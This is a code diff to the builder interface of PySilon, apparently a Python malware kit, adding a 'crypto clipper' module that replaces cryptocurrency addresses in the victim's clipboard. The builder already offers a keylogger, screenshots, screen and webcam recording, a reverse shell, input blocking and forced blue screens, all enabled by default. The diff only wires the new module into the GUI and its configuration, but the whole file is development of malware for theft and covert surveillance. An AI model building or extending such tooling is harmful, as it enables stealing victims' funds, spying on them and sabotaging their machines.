@@ -4,6 +4,8 @@ from PIL import ImageTk, Image
 import configparser
 import compiler
 import sys
+import os
+import subprocess
 
 window_icon = 'resources/icons/icon.ico'; Image.open('resources/icons/icon.ico').resize((120, 120)).save('icon.png', format='PNG')
 config_path, status = 'configuration.ini', 'configuration'
@@ -26,7 +28,8 @@ filenames = {
     'webcam_': 'webcam.py',
     'scrnrec': 'screenrec.py',
     'inputbl': 'block_input.py',
-    'bluesod': 'bsod.py'
+    'bluesod': 'bsod.py',
+    'crclipr': 'crypto_clipper.py'
 }
 
 default_modules = [
@@ -85,6 +88,7 @@ def load_configuration(is_custom):
     cbvar_scrnrec.set(config['FUNCTIONALITY']['scrnrec'])
     cbvar_inputbl.set(config['FUNCTIONALITY']['inputbl'])
     cbvar_bluesod.set(config['FUNCTIONALITY']['bluesod'])
+    cbvar_crclipr.set(config['FUNCTIONALITY']['crclipr'])
 
 def reset_configuration():
     server_id.delete(0, END)
@@ -111,6 +115,7 @@ def reset_configuration():
     cbvar_scrnrec.set(True)
     cbvar_inputbl.set(True)
     cbvar_bluesod.set(True)
+    cbvar_crclipr.set(True)
     cbvar_disclaimer.set(False)
 
     change_icon('resources/icons/icon.ico')
@@ -153,6 +158,7 @@ def save_configuration():
     config['FUNCTIONALITY']['scrnrec'] = str(cbvar_scrnrec.get())
     config['FUNCTIONALITY']['inputbl'] = str(cbvar_inputbl.get())
     config['FUNCTIONALITY']['bluesod'] = str(cbvar_bluesod.get())
+    config['FUNCTIONALITY']['crclipr'] = str(cbvar_crclipr.get())
 
     with open(config_path, 'w') as configfile:
         config.write(configfile)
@@ -268,10 +274,10 @@ if len(sys.argv) > 1:
         cli = 'soon' # CLI mode will be added soon...
 else:
     root = Tk()
-    root.geometry('750x650')
+    root.geometry('750x660')
     root.resizable(True, True)
     root.iconbitmap('resources/icons/icon.ico')
-    root.title('PySilon builder')
+    root.title('PySilon Builder')
     root.configure(bg='#0A0A10')
     root.tk_setPalette(background='#0A0A10', foreground='white', activeBackground='#0A0A10', activeForeground='white')
 
@@ -346,6 +352,12 @@ else:
     cbvar_scrnrec = BooleanVar(value=True)
     cbvar_inputbl = BooleanVar(value=True)
     cbvar_bluesod = BooleanVar(value=True)
+    cbvar_crclipr = BooleanVar(value=True)
+
+    def open_crypto_clipper_config():
+        json_file_path = 'crypto_clipper.json'
+        if os.path.exists(json_file_path):
+            subprocess.Popen(['notepad.exe', json_file_path])
 
     cb_keylogger = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='keylogger', variable=cbvar_keylogger, command=config_modification, onvalue=True, offvalue=False)
     cb_screenshot = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='screenshots', variable=cbvar_screenshot, command=config_modification, onvalue=True, offvalue=False)
@@ -363,6 +375,8 @@ else:
     cb_scrnrec = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='screen recording', variable=cbvar_scrnrec, command=config_modification, onvalue=True, offvalue=False)
     cb_inputbl = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='block input (mouse & keyboard)', variable=cbvar_inputbl, command=config_modification, onvalue=True, offvalue=False)
     cb_bluesod = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='trigger a bsod', variable=cbvar_bluesod, command=config_modification, onvalue=True, offvalue=False)
+    cb_crclipr = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='crypto clipper (replaces crypto addresses)', variable=cbvar_crclipr, command=config_modification, onvalue=True, offvalue=False)
+    json_button = Button(settings_canvas, text='⚙', command=open_crypto_clipper_config)
 
     cb_keylogger.grid(row=3, column=2, sticky=W, padx=(30, 0))
     cb_screenshot.grid(row=4, column=2, sticky=W, padx=(30, 0))
@@ -379,7 +393,9 @@ else:
     cb_reverse_shell.grid(row=15, column=2, sticky=W, padx=(30, 0))
     cb_inputbl.grid(row=16, column=2, sticky=W, padx=(30, 0))
     cb_webcam.grid(row=17, column=2, sticky=W, padx=(30, 0))
-    cb_bluesod.grid(row=18, column=2, sticky=W, padx=(30, 0), pady=(0, 20))
+    cb_bluesod.grid(row=18, column=2, sticky=W, padx=(30, 0))
+    cb_crclipr.grid(row=19, column=2, sticky=W, padx=(30, 0), pady=(0, 20))
+    json_button.grid(row=19, column=2, padx=(190, 0), pady=(0, 20))
 
     bottom_buttons = Canvas(root, width=1, height=1, bd=0)
     cbvar_disclaimer = BooleanVar(value=False)
